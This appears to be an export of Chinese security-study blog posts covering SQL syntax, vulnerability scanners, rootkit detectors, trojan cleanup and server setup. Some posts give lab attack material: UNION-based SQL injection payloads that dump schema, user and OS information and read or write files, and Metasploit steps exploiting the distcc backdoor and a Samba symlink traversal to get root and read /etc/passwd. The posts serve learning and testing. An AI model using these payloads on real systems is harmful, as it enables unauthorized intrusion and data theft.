    <url>%2F2018%2F08%2F22%2FSQL%E8%AF%AD%E5%8F%A5%E5%AE%9E%E6%93%8D%2F</url>
    <content type="text"><![CDATA[知识点逻辑运算符： NOT 或 ！：逻辑非 AND 或 &amp;&amp;：逻辑与 OR 或 ||：逻辑或 XOR：逻辑异或 1、逻辑非 ( NOT 或 ！) (1) 当操作数为 0 时，所得值为 1 (2) 当操作数为非 0 时，所得值为 0 (3) 当操作数为 NULL 时，所得值为 NULL !T = F !F = T 2、逻辑与 ( AND 或 &amp;&amp; ) (1) 当所有操作数均为非零值、并且不为 NULL 时，所得值为 1 (2) 当一个或多个操作数为 0 时，所得值为 0 (3) 其余情况所得值为 NULL T &amp;&amp; T = T T &amp;&amp; F = F F &amp;&amp; F = F 3、逻辑或 ( OR 或 || ) (1) 当两个操作数均为非 NULL 值，且任意一个操作数为非零值时，结果为 1 ，否则为 0 (2) 当有一个操作数为 NULL ，且另一个操作数为非零值时，则结果为 1 ，否则结果为 NULL (3) 当两个操作数均为 NULL 时，则所得结果为 NULL T || T = T T || F = T F || F = F 4、逻辑异或 (1) a XOR b 的计算等同于 ( a AND (NOT b) ) 或 ( (NOT a) AND b ) (2) 当任意一个操作数为 NULL 时，返回值为 NULL (3) 对于非 NULL 的操作数，如果两个操作数都是非 0 值或者都是 0 值，则返回结果为 0 (4) 如果一个为 0 值，另一个为非 0 值，返回结果为 1 T XOR T = F T XOR F = T F XOR F = F 5、逻辑运算符的优先级: 括号&gt;比较运算符&gt;非&gt;与&gt;或 相同优先级的运算符由左向右依次执行 例: 1、Select 1=1 or 1=2 and 2=2 2、Select （ 1=1 or 1=2 ) and 2=2 1、分解为 Select 1=2 and 2=2 结果为 0 Select 1=1 or 0 结果为1 2、分解为 Select 1=1 or 1=2 结果为 1 Select 1 and 2=2 结果为1 表连接：当需要同时显示多个表中的字段时，就可以用表连接来实现，这样的功能。 从大类上分，表连接分为以下4类： 【内连接】：仅选出两张表中互相匹配的记录 【左连接】：包含所有的左边表中的记录甚至是右边表中没有和它匹配的记录 【右连接】：包含所有的右边表中的记录甚至是左边表中没有和它匹配的记录 【外连接】：两边表中的内容全部显示 SQL连接（JOIN）SQL JOIN 子句用于把来自两个或多个表的行结合起来，基于这些表之间的共同字段。 最常见的 JOIN 类型：SQL INNER JOIN（简单的 JOIN）。 SQL INNER JOIN 从多个表中返回满足 JOIN 条件的所有行。 INNER JOIN：如果表中有至少一个匹配，则返回行 SQL INNER JOIN 语法 SELECT column_name(s) FROM table1 INNER JOIN table2 ON table1.column_name=table2.column_name; select student.student_name,student.student_sex,grade.subject1,grade.grade1,grade.createtimestamp,grade.updatetimestamp -&gt; from student -&gt; inner join grade -&gt; on student.student_id=grade.student_id; LEFT JOIN：即使右表中没有匹配，也从左表返回所有的行 SQL LEFT JOIN 语法SELECT column_name(s) FROM table1 LEFT JOIN table2 ON table1.column_name=table2.column_name; RIGHT JOIN：即使左表中没有匹配，也从右表返回所有的行 SQL RIGHT JOIN 语法SELECT column_name(s) FROM table1 RIGHT JOIN table2 ON table1.column_name=table2.column_name; FULL JOIN：只要其中一个表中存在匹配，则返回行 SQL FULL OUTER JOIN 语法 SELECT column_name(s) FROM table1 FULL OUTER JOIN table2 ON table1.column_name=table2.column_name; 练习题：student表 student_score表 1.插入一条学生学籍信息，及两条学生成绩信息。 insert into student values(‘13’,’张三’,’男’,’福建’,’泉州’,null’,’23’,null); insert into student_score values(‘10’,’Python入门’,’80.5’,’16’,null,null); insert into student_score values(‘11’,’密码学基本原理’,’95.5’,’16’,null,null); 2.查询目前都有哪些课程。 select distinct lesson from student_score; //distinct去除重复的课程 3.查询学生姓名学了哪些课程，每门课程的成绩 select student.student_name,student_score.lesson,student_score.score from student inner join student_score on student.student_id=student_score.student_id; 4.查询某一课程最高分数的学生的姓名 方法一：SELECT student_name,score,lesson from student,student_score where student_score.lesson=(‘WEB安全’) and student.student_id=student_score.student_id order by student_score.score desc LIMIT 1; 方法二：select a.student_name,b.score from student a,student_score b where a.student_id=b.student_id and b.score = (select max(score) from student_score where lesson = ‘SQL基本语法’) and lesson = ‘SQL基本语法’; 5.查询所有学生学籍信息及某一科课程的课程名称、成绩、学时。 select student.*,student_score.lesson,student_score.score,student_score.duration from student left join student_score on student.student_id=student_score.student_id; （2） select * from student where student_id = ‘$student_id’ 以上SQL语句中，$student_id为变量，可以用字符串代替 要求:1.查询所有学生的信息 select from student where student_id = ‘1’ and 1=2 UNION select from student– ‘ 2.查询表结构 select * from information_schema.columns where TABLE_NAME=’student’; select * from student where student_id = ‘’ UNION select COLUMN_NAME,DATA_TYPE,COLUMN_TYPE,COLUMN_DEFAULT,IS_NULLABLE,COLUMN_KEY,EXTRA,8 from information_schema.columns where TABLE_NAME=(‘student’) – ‘ ; 3.获取数据库信息 select * from student where student_id = ‘ 1’ and 1=2 UNION SELECT 1,database(),user(),VERSION(),5,6,7,8 – ‘ 4.获得操作系统信息 select * from student where student_id = ‘’ UNION SELECT 1,@@global.version_compile_os,3,4,5,6,7,8 – ‘ 或select * from student where student_id = ‘1’and 1=2 union select 1,2,3,4,5,6,7,@@global.version_compile_os from mysql.user ; 5.查看所有数据库名称 select * from student where student_id = ‘’ UNION select 1,TABLE_NAME,3,4,5,6,7,8 from information_schema.columns – ‘ 继续：1.用load_file读取文件 C:\Program Files\MySQL\MySQL Server 5.5\my.ini select * from student where student_id = ‘’ union select 1,1,1,1,load_file(‘C:\Program Files\MySQL\MySQL Server 5.5\my.ini’),2,3,4 – ‘ 2.将student表内容导出到文件当中 select * from student into outfile (‘C:\Program Files\MySQL\MySQL Server 5.5\hyd.txt’) 3.查询学生姓名及【SQL基本语法】成绩、并对成绩按照以下分类 100-85 优 85-70 良 60-70 中 60以下 差 select a.student_name,b.lesson,b.score, (case when b.score &gt; 85 then ‘优’ when b.score &gt; 70 then ‘良’ when b.score &gt; 60 then ‘中’ else ‘差’ end) as ‘result’ from student a,student_score b where a.student_id=b.student_id and b.lesson=(‘SQL基本语法’); 补充：case语句用法 4.尝试通过mysql查询语句库和站是否分离 exists(select * from student where 1=(Select (case when host_name()=@servername then 1 else 0 end))) 5.利用ascii码10进制打出”SQL lesson” select ASCII(‘n’) as result from dual select char(83,81,76,32,108,101,115,115,111,110) as result from dual 6.查询student数据库存放的物理位置例如”c:\users\temp” show GLOBAL variables like “%data%” 7.写出猜测当前用户权限的SQL select * from student where student_id = ‘1’ and ord(mid(user(),1,1))=116 参考文献http://www.runoob.com/sql/sql-join.html]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>SQL语句</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[SQL语句基础]]></title>
    <url>%2F2018%2F08%2F22%2FSQL%E8%AF%AD%E5%8F%A5%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[【前言】结构化查询语言（Structured Query Language）简称为SQL。是一种特殊目的的编程语言，是一种与数据库进行交互的程序设计语言。 SQL作用： 用于存取数据以及查询、更新和管理关系型数据库。用于存取数据以及查询、更新和管理关系型数据库。 关系型数据库： 1.可以用SQL语句方便的在一个表以及多个表之间做非常复杂的数据查询。 2.支持事务、使得对于安全性能很高的数据访问要求得以实现。 包括Mysql、Oracle、Sql Server、DB2、ACCESS 非关系型数据库： 1.NOSQL是基于键值对的，不需要经过SQL层的解析，所以性能非常高。 2.同样也是因为基于键值对，数据之间没有耦合性，所以非常容易水平扩展。 3.基于以上特点、目前流行的大数据处理多数会选择NOSQL数据库。 （包括NoSql）:MongoDB、Redis、neo4j） SQL类型： DCL：数据控制语言 DDL：数据定义语言 DML:数据操作语言 1234567891011net start mysql \#启动mysql服务器 net stop mysql #关闭 mysql -h 主机地址 -u 用户名 －p 用户密码 #进入 exit #退出 status; #显示当前mysql的version的各种信息。show databases; \#显示数据库 12345678910111213#插入数据 insert into student values(null,&apos;aa&apos;,&apos;男&apos;,&apos;1988-10-2&apos;,&apos;......&apos;); insert into student values(null,&apos;bb&apos;,&apos;女&apos;,&apos;1889-03-6&apos;,&apos;......&apos;); insert into student values(null,&apos;cc&apos;,&apos;男&apos;,&apos;1889-08-8&apos;,&apos;......&apos;); insert into student values(null,&apos;dd&apos;,&apos;女&apos;,&apos;1889-12-8&apos;,&apos;......&apos;); insert into student values(null,&apos;ee&apos;,&apos;女&apos;,&apos;1889-09-6&apos;,&apos;......&apos;); insert into student values(null,&apos;ff&apos;,&apos;null&apos;,&apos;1889-09-6&apos;,&apos;......&apos;); 12345#查询表中的数据 select * from student; select id,name from student; 123#修改某一条数据 update student set sex=&apos;男&apos; where id=4; 1234567891011121314151617#删除数据delete from student where id=5; #and 且select * from student where date&gt;&apos;1988-1-2&apos; and date&lt;&apos;1988-12-1&apos;; #or 或select * from student where date&lt;&apos;1988-11-2&apos; or date&gt;&apos;1988-12-1&apos;; #betweenselect * from student where date between &apos;1988-1-2&apos; and &apos;1988-12-1&apos;; #in 查询制定集合内的数据select * from student where id in (1,3,5); #排序 asc 升序 desc 降序select * from student order by id asc; SELECT语句中常用的函数： CONCAT：将多个字符串连接成一个字符串。 CONCAT_WS：是CONCAT()的特殊形式。第一个参数是其它参数的分隔符。分隔符的位 置放在要连接的两个字符串之间。分隔符可以是一个字符串，也可以是 其它参数。 GROUP_CONCAT：group_concat([DISTINCT] 要连接的字段 [Order BY ASC/DESC 排 序字段] [Separator ‘分隔符’]) AVG () ：返回数值列的平均值。NULL 值不包括在计算中。 COUNT() ：返回指定列的值的数目（NULL 不计入）。 MAX()：返回一列中的最大值。NULL 值不包括在计算中。 MIN()：返回一列中的最小值。NULL 值不包括在计算中。 SUM()：返回数值列的总数（总额）。 LEN()：返回文本字段中值的长度。 ROUND(column_name,decimals)：用于把数值字段舍入为指定的小数位数。 #分组查询 #聚合函数1select max(id),name,sex from student group by sex; 1select min(date) from student; 1select avg(id) as &apos;求平均&apos; from student; 1select count(*) from student; #统计表中总数 1select count(sex) from student; #统计表中性别总数 若有一条数据中sex为空的话,就不予以统计~ 1select sum(id) from student; #查询第i条以后到第j条的数据(不包括第i条)1select * from student limit 2,5; #显示3-5条数据 参考文献：https://www.cnblogs.com/zhuyongzhe/p/7686105.html]]></content>
      <categories>
        <category>编程语言</category>
      </categories>
      <tags>
        <tag>SQL语句</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nessus基本使用]]></title>
    <url>%2F2018%2F08%2F22%2FNessus%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[【前言】Nessus Professional是行业中部署最广泛的漏洞评估解决方案，可帮助用户减少组织的攻击面并确保合规性。Nessus具有高速资产发现，配置审计，目标分析，恶意软件检测，敏感数据发现等功能。 Nessus支持比竞争对手解决方案更多的技术，扫描操作系统，网络设备，虚拟机管理程序，数据库，Web服务器以及关键基础设施，以解决漏洞，威胁和违规问题。 随着世界上最大的不断更新的漏洞和配置检查库，以及Tenable公司的专家漏洞研究小组的支持，Nessus设定了漏洞扫描速度和准确性的标准。 特点： 提供完整的电脑漏洞扫描服务, 并随时更新其漏洞数据库。 可同时在本机或远端上摇控, 进行系统的漏洞分析扫描。 其运作效能能随着系统的资源而自行调整。 可自行定义插件(Plug-in)，完整支持SSL (Secure Socket Layer)。 Nessus导航 ​ 顶部的导航条显示两个主页面的链接：扫描和设置。您可以使用这两个页面执行所有Nessus主要任务。点击页面名称打开相应的页面。 扫描 ​ 在“ 扫描”页面上，您可以创建，查看和管理扫描和资源。要访问“ 扫描”页面，请在顶部导航栏中单击“ 扫描”。左侧导航栏显示文件夹和资源两部分。 文件夹 文件夹”部分始终包含以下不能删除的默认文件夹：我的扫描、所有扫描、废纸搂。 当您访问“ 扫描”页面时，将显示“ 我的扫描”文件夹。当您创建扫描时，它默认显示在“ 我的扫描”文件夹中。 在所有扫描的文件夹显示所创建的所有扫描以及与有权限进行交互的任何扫描。可以点击文件夹中的扫描来查看扫描结果。 废纸篓”文件夹显示已删除的扫描。可以从Nessus实例中永久删除扫描，或将扫描恢复到选定的文件夹。如果删除包含扫描的文件夹，则该文件夹中的所有扫描都将移至“ 废纸篓”文件夹。存储在“ 垃圾箱”文件夹中的扫描将在30天后自动删除。 插件规则 ​ 允许你隐藏或改变任何给定的插件的严重性。另外，规则可以限制在特定的主机或特定的时间范围内。在此页面上，您可以查看，创建，编辑和删除您的规则。 扫描器 该扫描器页面显示的链接键和遥控器的扫描器列表。您可以点击链接的扫描器查看有关该扫描器的详细信息。 扫描器由扫描器类型标识，并指示扫描器是否具有共享权限。 可以使用链接密钥或有效帐户凭证将远程扫描器链接到Nessus Manager。一旦链接，扫描器可以在本地进行管理，并在配置扫描时进行选择。 扫描模板 ​ 可用的模板可能会有所不同。Nessus界面提供产品中每个模板的简要说明 设置 ​ 每个策略都存在以下设置，但可用的配置项目可能因所选模板而异： 凭证 ​ 每个策略都存在以下设置，但可用的配置项目可能因所选模板而异： 云服务 数据库：包括MongoDB，Oracle，MySQL，DB2，PostgreSQL和SQL Server 主机：其中包括Windows登录，SSH和SNMPv3 其他服务：VMware，Red Hat Enterprise Virtualization等 明文身份验证机制：包括FTP，HTTP，POP3和其他服务 合规检测 ​ Nessus可以执行网络服务的漏洞扫描以及登录到服务器以发现任何缺少的补丁。没有漏洞并不意味着服务器配置是正确的，或者与特定标准要求“相符” 插件 ​ 插件选项可以选择插件系列的安全检查或单个插件检查 “ 关于”页面显示Nessus许可和插件信息的概述。当您访问产品设置时，默认情况下出现关于页面。 SMTP服务 “ SMTP服务器”页面显示允许您配置简单邮件传输协议（SMTP）服务器的选项。当您配置SMTP服务器时，Nessus会将扫描结果通过电子邮件发送到您指定的收件人列表。 用户 ​ 在此页面上，您可以查看，创建，编辑和删除用户。一旦创建，用户就配置了一个角色，它决定了他们的扫描器权限。 命令行： 启动或停止Nessus ​ Windows 1、导航到 服务。 2、在 名称 列中，单击Tenable Nessus。 3、要停止Nessus服务，请右键单击 Tenable Nessus，然后单击停止。 4、要重新启动Nessus服务，请右键单击 Tenable Nessus，然后单击开始。 Linux 扫描报告 点击扫描结果文件夹，选择要下载的扫描任务 选择下载目标，点击左上角输出，选择输出文件格式。 【官网链接】https://www.tenable.com/products/nessus-home]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>Nessus</tag>
        <tag>安全工具</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AppScan工具基本使用]]></title>
    <url>%2F2018%2F08%2F20%2FAppScan%E5%B7%A5%E5%85%B7%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[0x01 【前言】Ratinal AppScan其实是一个产品家族，包括众多的应用安全扫描产品。从开发阶段的源代码扫描的 AppScan source edition，到针对 Web 应用进行快速扫描的 AppScan standard edition，以及进行安全管理和汇总整合的 AppScan enterprise Edition 等。我们经常说的 AppScan 就是指的桌面版本的 AppScan，即 AppScan standard edition。其安装在 Windows 操作系统上，可以对网站等 Web 应用进行自动化的应用安全扫描和测试。 AppScan工作原理小结如下： 通过搜索（爬行）发现整个 Web 应用结构 根据分析，发送修改的 HTTP Request 进行攻击尝试（扫描规则库） 通过对于 Respone 的分析验证是否存在安全漏洞 AppScan扫描原理：扫描规则库+爬行+测试 AppScan 的核心是提供一个扫描规则库，然后利用自动化的“探索”技术得到众多的页面和页面参数，进而对这些页面和页面参数进行安全性测试。“扫描规则库”，“探索”，“测试”就构成了 AppScan 的核心三要素。而在安全扫描过程中，如何进行优化，就要结合这三个要素，看哪些部分需要优化，应该如何优化。 0x02 【使用步骤】1、打开AppScan软件，点击工具栏上的文件，新建，出现一个dialog。 2、点击“Regular Scan”。出现扫描配置向导页面，这里是选择“AppScan”，如图： 3、输入扫描项目目标URL 4、点击“下一步”，选择认证模式，出现登录管理的页面，这是因为对于大部分网站，需要用户名和密码登录进去才可以查看许多内容，未登录的情况下就只可以访问部分页面。 5、点击“下一步”，出现测试策略的页面，可以根据不同的测试需求进行选择6、点击“下一步”，出现完成配置向导的界面，这里使用默认配置，可根据需求更改。 7、点击“完成”，设置保存路径，即开始扫描。 0x03 扫描结果 红色叹号表示高危漏洞，每一个漏洞都有详细的列出来，工具栏中的”报告“，可以将扫描结果导出来。 0x04 【参考资料】http://www.mamicode.com/info-detail-1879133.html http://www.360doc.com/content/17/0219/20/32626470_630367925.shtml]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>AppScan</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[AWVS的基本使用]]></title>
    <url>%2F2018%2F08%2F20%2FAWVS%E7%9A%84%E5%9F%BA%E6%9C%AC%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[0x01 【前言】Acuneti Webb Vulnerability Scanner是一款知名的Web网络漏洞扫描工具，它通过网络爬虫测试你的网站安全，检测流行安全漏洞。现已更新到11，下面介绍9版本。 0x02 【功能or特点】自动的客户端脚本分析器，允许对Ajax和Web 2.0应用程序进行安全性测试。 业内最先进且深入的SQL注入和跨站脚本测试； 高级渗透测试工具，例如HTTP Editor和HTTP Fuzzer； 可视化宏记录器帮助您轻松测试web表格和受密码保护的区域 支持含有 CAPTHCA 的页面，单个开始指令和 Two Factor（双因素）验证 机制 丰富的报告功能，包括 VISA PCI 依从性报告 高速的多线程扫描器轻松检索成千上万个页面 智能爬行程序检测 web 服务器类型和应用程序语言 Acunetix检索并分析网站，包括 flash 内容、SOAP 和 AJAX 端口扫描 web 服务器并对在服务器上运行的网络服务执行安全检查 可导出网站漏洞文件 0x03 AWVS menus bar（AWVS菜单栏） 0x04 AWVS工具栏从左到右分别是：新建扫描——网站扫描——网站爬行——目标查找——目标探 测——子域名扫描——SQL盲注——HTTP编辑——HTTP嗅 探——HTTP Fuzzer——认证测试——结果对比——WSDL扫 描——WSDL编辑测试——程序设置——扫描设置——侧重扫 描设置——计划任务——报告 0x05 AWVS 新建扫描1、点击菜单栏的 New Scan 新建一次扫描， 网站扫描开始前，需要 设定下面选项: （1). Scan type （2). Options （3). Target （4). Login （5). Finsh AWVS 新建扫描——Scan type AWVS 新建扫描——Options 接着，点击下一步按钮，在scanning profile里面选择安全扫面的漏洞种类（其实就是payload） Options——Scanning profile Scanning profile： 设置侧重扫描的类型，包含16种侧 重检测类型 AWVS 新建扫描——Target AWVS 新建扫描——Login 这个Login sequence，我要讲一下，当你的网站需要深入扫描的时候，我们就可以使用这个Login sequence功能，这个功能通过你输入网站的用户名密码登录之后，AWVS就可以扫描登录以后的权限页面，如果你不登录，那么，AWVS就没有权限扫描需要用户名密码登录之后的页面了（因为这些页面都需要特定的权限验证之后才能访问，所以，我把他们叫做权限页面），如果保持默认设置，那么AWVS就无权扫描你的权限页面，此处，我们使用默认设置就好了，点击下一步，来到完成设置页面。 AWVS 新建扫描——Finish 点击Finish，完成AWVS的扫描设置（点击Finish按钮之前，AWVS还未进行任何的安全扫描），当点击Finish按钮之后，AWVS就开始对你提供的域名（或者IP亦可）进行安全扫描了。 0x06 扫描结果 可以看到，右边，process=100.0%，看来安全扫描全部进行完毕，而process上面已经说的很清楚了，红色感叹号代表高危漏洞，黄色的感叹号代表中危漏洞，蓝色感叹号代表低危漏洞，绿色感叹号代表信息泄露，其实，我们在做渗透测试的大多数时候，只需要关注高危漏洞就可以了。 0x07 结果导出 主界面——Scanning Profiles scripts 主界面——Scan Setting 批量扫描 Acunetix的计划任务，主要特性如下:（a). 可用于大量扫描，扫描结果保存在“C:\Users\Public\Documents\AcunetixWVS 10\Saves”。 （b). 扫描结束，可以使用邮件通知。 （c). 可设定计划时间，什么时候允许扫描，什么时候不允许扫描 蜘蛛爬行功能 目标探测工具（Target Finder） 子域名探测工具（Subdomain Scanner） SQL盲注测试工具（Blind SQL Injection） ➢AWVS的HTTP嗅探工具（HTTP Sniffer） ➢AWVS的HTTP模糊测试工具（HTTP Fuzzer） ➢AWVS的认证测试工具（Authentication Tester） ➢AWVS的WEB WSDL扫描测试工具（Web Services Scanner、 Web Services Editor） 0x08 参考文献https://blog.csdn.net/lynnlinlin/article/details/52947526]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>AWVS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[查杀"一路赚钱木马"]]></title>
    <url>%2F2018%2F08%2F20%2F%E6%9F%A5%E6%9D%80%E4%B8%80%E8%B7%AF%E8%B5%9A%E9%92%B1%E6%9C%A8%E9%A9%AC%2F</url>
    <content type="text"><![CDATA[0x01 【准备工作】虚拟机的网络适配器选择NAT连接，防止感染物理主机。 植入木马：将mservice.sh的执行文件放在根（/）目录下 执行脚本开始挣钱：1sudo bash mservice.sh 55138 //55138为自己的一路挣钱ID号 0x02 【查找木马】1.通过查看top 看到CPU占有197.7% （2个CPU） 2.通过lsof -p 51885查看xig的进程目录，和用lsof -i 查看端口开放状态。3.通过命令cat /etc/passwd 发现了陌生用户和可疑 4.用iostat命令查看块设备运行状态 5.用netstat -anplt查看端口开放情况，发现了几个可疑的端口和对应的服务。 6.用crontab -l命令查看计划任务，发现了可疑状态。 7.在/opt中目录中新增了如下的可疑文件 8.查看这些文件的内容如下： 9.查看开机启动项systemctl list-unit-files | grep enable，发现YiluzhuanqianSer.service服务。 10.其他：（1）通过命令find . -type -f atime -3搜索最近3天内被访问过的所有文件 （2）history 查看命令历史。less tail -200 .bash_history查看200条各用户命令记录。 （3）last查看最近登录用户。 （4）检测alias别名 0x03 【清除木马】1.去除可疑文件的权限 2.删除可以的文件和目录 3.清除计划任务。1crontab -r //清除计划任务 4.关掉可疑的开机自启服务YiluzhuanqianSer.service 5.查看进程，杀死可疑的服务进程123ps auxkill -9 51877 6、reboot 重启0x04 【检测已经清除木马】CUP运行正常： 端口开放正常： 一路赚钱后台212的IP已经离线： 0x05 【参考文献】https://www.jianshu.com/p/26d1567c4d0b https://wenku.baidu.com/view/d9c72c596c85ec3a86c2c54e.html]]></content>
      <categories>
        <category>木马查杀</category>
      </categories>
      <tags>
        <tag>木马查杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[编译安装rkhunter && chkrootkit(后门检测工具)]]></title>
    <url>%2F2018%2F08%2F20%2F%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85rkhunter-chkrootkit-%E5%90%8E%E9%97%A8%E6%A3%80%E6%B5%8B%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[安装包类型：rkhunter-1.4.6.tar.gzchkrootkit.tar.gz 一、rkhunter（后门检测工具）rootkit是Linux平台下最常见的一种木马后门工具，它主要通过替换系统文件来达到入侵和和隐蔽的目的，这种木马比普通木马后门更加危险和隐蔽，普通的检测工具和检查手段很难发现这种木马。rootkit攻击能力极强，对系统的危害很大，它通过一套工具来建立后门和隐藏行迹，从而让攻击者保住权限，以使它在任何时候都可以使用root 权限登录到系统。 1.解压rkhunter安装包123tar -zxf rkhunter-1.4.6.tar.gz cd rkhunter-1.4.6/./installer.sh --install 2.为基本系统程序建立校对样本，建议系统安装完成后就建立。12rkhunter --propupdls /var/lib/rkhunter/db/rkhunter.dat 3.运行rkhunter检查系统 它主要执行下面一系列的测试: ​ 1. MD5校验测试, 检测任何文件是否改动. ​ 2. 检测rootkits使用的二进制和系统工具文件. ​ 3. 检测特洛伊木马程序的特征码. ​ 4. 检测大多常用程序的文件异常属性. ​ 5. 执行一些系统相关的测试 - 因为rootkit hunter可支持多个系统平台. ​ 6. 扫描任何混杂模式下的接口和后门程序常用的端口. ​ 7. 检测如/etc/rc.d/目录下的所有配置文件, 日志文件, 任何异常的隐藏文件等等. 例如, 在检测/dev/.udev和/etc/.pwd.lock文件时候, 我的系统被警告. ​ 8. 对一些使用常用端口的应用程序进行版本测试. 如: Apache Web Server, Procmail等. 4.执行检测命令：1rkhunter --check 5.在线升级rkhunterrkhunter是通过一个含有rootkit名字的数据库来检测系统的rootkits漏洞, 所以经常更新该数据库非常重要, 你可以通过下面命令来更新该数据库:1rkhunter --update 二、chkrootkitchkrootkit 在监测 rootkit 是否被安装的过程中，需要使用到一些操作系统本身的命令。但不排除一种情况，那就是入侵者有针对性的已经将 chkrootkit 使用的系统命令也做修改，使得 chkrootkit 无法监测 rootkit ，从而达到即使系统安装了 chkrootkit 也无法检测出 rootkit 的存在，从而依然对系统有着控制的途径，而达到入侵的目的。那样的话，用 chkrootkit 构建入侵监测系统将失去任何意义。对此，我们在操作系统刚被安装之后，或者说服务器开放之前，让 chkrootkit 就开始工作。而且，在服务器开放之前，备份 chkrootkit 使用的系统命 令，在一些必要的时候（怀疑系统命令已被修改的情况等等），让 chkrootkit 使用初始备份的系统命令进行工作。 1.解压chkrootkit压缩包1tar -zxvf chkrootkit.tar.gz 2.安装chkrootkit12cd chkrootkit-0.52/make sense 3.将chkrootkit移到系统启动目录下123mv chkrootkit /usr/sbin/chkrootkitchkrootkit | grep INFECTED 安装完成！ 参考文献：https://www.cnblogs.com/cp-miao/p/6141025.html https://www.osyunwei.com/archives/10099.html https://www.kafan.cn/edu/5550504.html]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>木马查杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Distcc后门漏洞 && Samba sysmlink默认配置目录遍历漏洞]]></title>
    <url>%2F2018%2F08%2F19%2FDistcc%E5%90%8E%E9%97%A8%E6%BC%8F%E6%B4%9E-Samba-sysmlink%E9%BB%98%E8%AE%A4%E9%85%8D%E7%BD%AE%E7%9B%AE%E5%BD%95%E9%81%8D%E5%8E%86%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[Distcc后门漏洞【目的】利用Distcc后门漏洞获取目标主机的root权限。 【原理】Distcc用于大量代码在网络服务器上的分布式编译，但是如果配置不严格，容易被滥用执行命令，该漏洞是XCode 1.5版本及其他版本的distcc 2.x版本配置对于服务器端口的访问不限制 【步骤】1234567891.在kali中执行msfconsole，启动metasploit 2use exploit/unix/misc/distcc_exec #选择漏洞show options #显示需要设置的参数set RHOST 192.168.199.126 #设置要攻击的靶机IPexploit #开始攻击 2.执行id 查看权限，uname -a 验证服务器信息。 Samba sysmlink默认配置目录遍历漏洞Samba是linux和unix系统上实现smb协议的一个免费软件，由客户机和服务器构成。 SMB是一种在局域网上实现共享文件和打印机的协议。存在一个服务器，客户机通过该协议可以服务器上的共享文件系统和打印机以及其他的资源。通过设置，还可以和全世界的电脑分享资源 : 【步骤】1234567891.在kali中执行msfconsole，启动metasploit2use auxiliary/admin/smb/samba_symlink_traversal #选择漏洞set RHOST 192.168.199.126 #设置要攻击的靶机IPset SMBSHARE tmp #设置SAM可写文件exploit #开始攻击 2.在新的终端下执行smbclient命令打开上面生成的共享目录12345smbclient //192.168.199.126/tmpcd rootfsls 3.列出密码1more /etc/passwd #列出密码文件，可用成功。]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>metasploit 2</tag>
        <tag>msf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CentOS 下 LNMP 环境配置（yum安装）]]></title>
    <url>%2F2018%2F08%2F15%2FCentOS-%E4%B8%8B-LNMP-%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%88yum%E5%AE%89%E8%A3%85%EF%BC%89%2F</url>
    <content type="text"><![CDATA[前言LNMP 环境代表 Linux 系统下 Nginx + MySQL + PHP 网站服务器架构。 Linux是一类Unix计算机操作系统的统称，是目前最流行的免费操作系统。代表版本有：debian、centos、ubuntu、fedora、gentoo等。 Nginx是一个高性能的HTTP和反向代理服务器，也是一个IMAP/POP3/SMTP代理服务器。 Mysql是一个小型关系型数据库管理系统。 PHP是一种在服务器端执行的嵌入HTML文档的脚本语言。 这四种软件均为免费开源软件，组合到一起，成为一个免费、高效、扩展性强的网站服务系统。 安装配置 Nginx自动安装 Nginx。输入命令：12yum install nginx systemctl start nginx 浏览器中测试 Nginx 服务是否正常运行。访问 CentOS 云服务器公网 IP。 安装配置 MySQL注意： 从 CentOS 7 系统开始，MariaDB 成为 yum 源中默认的数据库安装包。在 CentOS 7 及以上的系统中使用 yum 安装 MySQL 包将无法使用 MySQL。您可以选择使用完全兼容的 MariaDB，或自行安装较低版本的 MySQL。 安装 MySQL。输入以下命令：1yum install mariadb mariadb-server 启动 MySQL 服务。1systemctl start mariadb.service 登录 MySQL ，删除空用户12MariaDB [(none)]&gt; select user,host,password from mysql.user;MariaDB [(none)]&gt; select user,host,password from mysql.user; 修改 root 密码。12MariaDB [(none)]&gt; update mysql.user set password = (&apos;toor&apos;) where user=&apos;root&apos;MariaDB [(none)]&gt; flush privileges; 安装配置 PHP安装 PHP 。输入命令进行安装：1yum install php lighttpd-fastcgi php-cli php-mysql php-gd php-imap php-ldap php-odbc php-pear php-xml php-xmlrpc php-mbstring php-mcrypt php-mssql php-snmp php-soap 安装所需组件使 PHP 支持 MySQL、FastCGI 模式。1yum install php-tidy php-common php-devel php-fpm php-mysql Nginx 与 PHP-FPM 集成启动 PHP-FPM。输入命令启动 PHP-FPM 服务1service php-fpm start 。 输入命令查看 PHP-FPM 默认配置1cat /etc/php-fpm.d/www.conf |grep -i &apos;listen =&apos; 返回结果为：listen = 127.0.0.1:9000，表明 PHP-FPM 默认配置的监听端口为 9000，只需修改配置，将 PHP 解析的请求转发到 127.0.0.0:9000 处理即可。 修改 Nginx 配置。 输入命令查找 Nginx 配置文件1nginx -t 使用vi命令修改该配置文件：1vim /etc/nginx/nginx.conf 修改红框里面的内容。 配置完成后，重启服务。1systemctl restart nginx 环境配置验证 用以下命令在 web 目录下创建 index.php：123vim /usr/share/nginx/html/index.php&lt;?php echo &quot;&lt;title&gt;Test Page&lt;/title&gt;&quot;; echo 